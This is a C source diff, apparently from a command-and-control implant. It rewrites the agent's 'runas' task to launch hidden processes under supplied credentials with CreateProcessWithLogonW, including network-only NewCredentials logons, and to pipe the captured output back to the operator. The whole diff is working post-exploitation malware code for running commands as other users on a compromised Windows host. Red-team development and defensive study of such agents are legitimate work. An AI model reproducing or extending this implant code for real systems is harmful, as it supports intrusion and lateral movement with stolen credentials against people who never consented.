@@ -71,32 +71,14 @@ void command_runas(char *task_id, char *params) {
     wchar_t wdomain[256]   = {0};
     MultiByteToWideChar(CP_UTF8, 0, username, -1, wusername, 256);
     MultiByteToWideChar(CP_UTF8, 0, password, -1, wpassword, 512);
-    if (domain[0] != '\0')
-        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdomain, 256);
+    MultiByteToWideChar(CP_UTF8, 0, domain[0] ? domain : ".", -1, wdomain, 256);
 
-    HANDLE hToken = NULL;
-    if (!LogonUserW(wusername,
-                    domain[0] != '\0' ? wdomain : NULL,
-                    wpassword,
-                    logon_type,
-                    LOGON32_PROVIDER_DEFAULT,
-                    &hToken)) {
-        char msg[320];
-        snprintf(msg, sizeof(msg),
-                 "Error: LogonUser failed for %s\\%s (err %lu, logon_type %d)",
-                 domain, username, GetLastError(), logon_type);
-        send_task_response(task_id, msg);
-        return;
-    }
-
-    // Pipes pour capturer stdout/stderr sans passer par un fichier temp
     HANDLE hReadOut  = NULL, hWriteOut  = NULL;
     HANDLE hReadErr  = NULL, hWriteErr  = NULL;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
 
     if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0) ||
         !CreatePipe(&hReadErr, &hWriteErr, &sa, 0)) {
-        CloseHandle(hToken);
         send_task_response(task_id, "Error: CreatePipe failed");
         return;
     }
@@ -124,34 +106,28 @@ void command_runas(char *task_id, char *params) {
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
 
-    // Impersonate -> CreateProcessAsUser -> RevertToSelf
-    if (!ImpersonateLoggedOnUser(hToken)) {
-        CloseHandle(hToken);
-        CloseHandle(hReadOut); CloseHandle(hWriteOut);
-        CloseHandle(hReadErr); CloseHandle(hWriteErr);
-        send_task_response(task_id, "Error: ImpersonateLoggedOnUser failed");
-        return;
-    }
+    /* logon_type 9 (NewCredentials) -> LOGON_NETCREDENTIALS_ONLY, others -> LOGON_WITH_PROFILE */
+    DWORD logon_flags = (logon_type == 9) ? LOGON_NETCREDENTIALS_ONLY : LOGON_WITH_PROFILE;
 
-    BOOL ok = CreateProcessAsUserW(
-        hToken, NULL, wcmd,
-        NULL, NULL, TRUE,
-        CREATE_NO_WINDOW, NULL, NULL,
+    BOOL ok = CreateProcessWithLogonW(
+        wusername, wdomain, wpassword,
+        logon_flags,
+        NULL, wcmd,
+        CREATE_NO_WINDOW,
+        NULL, NULL,
         &si, &pi);
     DWORD err = GetLastError();
 
-    RevertToSelf();
     CloseHandle(hWriteOut);
     CloseHandle(hWriteErr);
 
     if (!ok) {
-        CloseHandle(hToken);
         CloseHandle(hReadOut);
         CloseHandle(hReadErr);
         char msg[320];
         snprintf(msg, sizeof(msg),
-                 "Error: CreateProcessAsUser failed for %s\\%s (err %lu)",
-                 domain, username, err);
+                 "Error: CreateProcessWithLogonW failed for %s\\%s (err %lu)",
+                 domain[0] ? domain : ".", username, err);
         send_task_response(task_id, msg);
         return;
     }
@@ -159,7 +135,6 @@ void command_runas(char *task_id, char *params) {
     WaitForSingleObject(pi.hProcess, 30000);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
-    CloseHandle(hToken);
 
     // Lire stdout
     char *output = (char *)malloc(1);
